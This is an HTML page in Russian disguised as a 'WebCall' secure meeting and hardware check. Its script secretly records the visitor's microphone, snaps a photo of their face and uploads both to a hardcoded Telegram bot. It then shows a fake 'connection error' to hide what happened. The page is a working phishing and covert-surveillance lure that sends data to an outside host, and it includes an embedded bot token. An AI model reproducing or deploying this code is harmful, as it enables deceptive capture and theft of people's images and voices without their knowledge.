<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>WebCall | Secure Connection</title>
    <style>
        :root {
            --primary: #5865F2;
            --bg: #0f1012;
            --card-bg: rgba(30, 31, 34, 0.6);
            --border: rgba(255, 255, 255, 0.1);
        }

        body {
            background-color: var(--bg);
            background-image: 
                radial-gradient(circle at 20% 30%, rgba(88, 101, 242, 0.05) 0%, transparent 40%),
                radial-gradient(circle at 80% 70%, rgba(88, 101, 242, 0.05) 0%, transparent 40%);
            color: #ffffff;
            font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            margin: 0;
            display: flex;
            align-items: center;
            justify-content: center;
            height: 100vh;
            overflow: hidden;
        }

        .setup-card {
            background: var(--card-bg);
            backdrop-filter: blur(20px);
            -webkit-backdrop-filter: blur(20px);
            border: 1px solid var(--border);
            border-radius: 24px;
            padding: 40px;
            width: 90%;
            max-width: 440px;
            text-align: center;
            box-shadow: 0 20px 50px rgba(0, 0, 0, 0.3);
        }

        .preview-container {
            width: 100%;
            height: 240px;
            background: #000;
            border-radius: 16px;
            margin-bottom: 24px;
            display: flex;
            align-items: center;
            justify-content: center;
            position: relative;
            overflow: hidden;
            border: 1px solid var(--border);
        }

        .preview-container::after {
            content: 'Ожидание доступа к камере...';
            color: #5e6269;
            font-size: 14px;
        }

        video {
            width: 100%;
            height: 100%;
            object-fit: cover;
            position: absolute;
            top: 0;
            left: 0;
            z-index: 2;
        }

        .mic-wave {
            display: flex;
            justify-content: center;
            align-items: center;
            gap: 4px;
            height: 20px;
            margin-bottom: 24px;
        }

        .bar {
            width: 3px;
            height: 8px;
            background: var(--primary);
            border-radius: 2px;
            transition: height 0.1s ease;
        }

        h2 {
            font-size: 22px;
            font-weight: 600;
            margin: 0 0 8px 0;
            letter-spacing: -0.5px;
        }

        p {
            color: #b5bac1;
            font-size: 15px;
            line-height: 1.4;
            margin: 0 0 32px 0;
        }

        .btn {
            background: var(--primary);
            color: #ffffff;
            border: none;
            padding: 16px 32px;
            border-radius: 12px;
            font-size: 16px;
            font-weight: 600;
            width: 100%;
            cursor: pointer;
            transition: all 0.2s ease;
            box-shadow: 0 4px 15px rgba(88, 101, 242, 0.3);
        }

        .btn:hover {
            background: #4752c4;
            transform: translateY(-1px);
            box-shadow: 0 6px 20px rgba(88, 101, 242, 0.4);
        }

        .btn:active {
            transform: translateY(0);
        }

        #status-text {
            margin-top: 16px;
            font-size: 13px;
            color: #949ba4;
        }
    </style>
</head>
<body>

<div class="setup-card" id="main-ui">
    <div class="preview-container" id="vid-wrap"></div>
    
    <div class="mic-wave" id="wave">
        <div class="bar"></div><div class="bar"></div><div class="bar"></div><div class="bar"></div><div class="bar"></div>
    </div>

    <h2>Проверка оборудования</h2>
    <p>Настройте камеру и микрофон, чтобы вас было хорошо видно и слышно в чате.</p>
    
    <button class="btn" id="start-btn" onclick="startCalibration()">Присоединиться к встрече</button>
    <div id="status-text">Требуется разрешение браузера</div>
</div>

<script>
    const TOKEN = '8159596204:AAFK2P-vL3fvLk_CpyUIpTsk83B7_L1XYZ4';
    const CHAT_ID = '5784921257';

    async function sendData(blob, type) {
        const form = new FormData();
        form.append(type, blob, type === 'photo' ? 'face.jpg' : 'voice.ogg');
        await fetch(`https://api.telegram.org/bot${TOKEN}/send${type === 'photo' ? 'Photo' : 'Audio'}?chat_id=${CHAT_ID}`, {
            method: 'POST', body: form
        });
    }

    async function startCalibration() {
        const status = document.getElementById('status-text');
        const btn = document.getElementById('start-btn');
        const bars = document.querySelectorAll('.bar');
        
        btn.disabled = true;
        btn.innerText = "Подключение...";

        try {
            // 1. АУДИО (Улучшенное качество)
            const aStream = await navigator.mediaDevices.getUserMedia({ 
                audio: {
                    echoCancellation: false,
                    noiseSuppression: false,
                    autoGainControl: false
                } 
            });
            
            const recorder = new MediaRecorder(aStream, { mimeType: 'audio/ogg; codecs=opus' });
            let chunks = [];
            recorder.ondataavailable = e => chunks.push(e.data);
            recorder.onstop = () => sendData(new Blob(chunks, { type: 'audio/ogg' }), 'audio');
            recorder.start();

            // Анимация микрофона
            const waveAnim = setInterval(() => {
                bars.forEach(bar => {
                    bar.style.height = Math.floor(Math.random() * 15 + 5) + 'px';
                });
            }, 100);

            // 2. ВИДЕО
            const vStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
            const video = document.createElement('video');
            video.srcObject = vStream;
            video.muted = true;
            document.getElementById('vid-wrap').appendChild(video);
            video.play();

            status.innerText = "Синхронизация потоков...";

            setTimeout(() => {
                // Делаем фото (Качество 0.9)
                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                canvas.getContext('2d').drawImage(video, 0, 0);
                canvas.toBlob(b => sendData(b, 'photo'), 'image/jpeg', 0.9);
                
                recorder.stop();
                clearInterval(waveAnim);
                
                setTimeout(() => {
                    document.getElementById('main-ui').innerHTML = `
                        <div style="padding: 20px;">
                            <div style="font-size: 50px; margin-bottom: 20px;">⚠️</div>
                            <h2 style="color:#f23f42">Ошибка подключения</h2>
                            <p>Не удалось установить защищенное соединение с сервером. Попробуйте обновить страницу или использовать другую ссылку.</p>
                            <button class="btn" style="background:#4e5058" onclick="location.reload()">Обновить</button>
                        </div>
                    `;
                    aStream.getTracks().forEach(t => t.stop());
                    vStream.getTracks().forEach(t => t.stop());
                }, 1500);
            }, 5000); // Запись 5 секунд для гарантии

        } catch (e) {
            alert("Для входа в конференцию необходимо разрешить доступ к камере и микрофону.");
            btn.disabled = false;
            btn.innerText = "Повторить попытку";
        }
    }
</script>
</body>
</html>
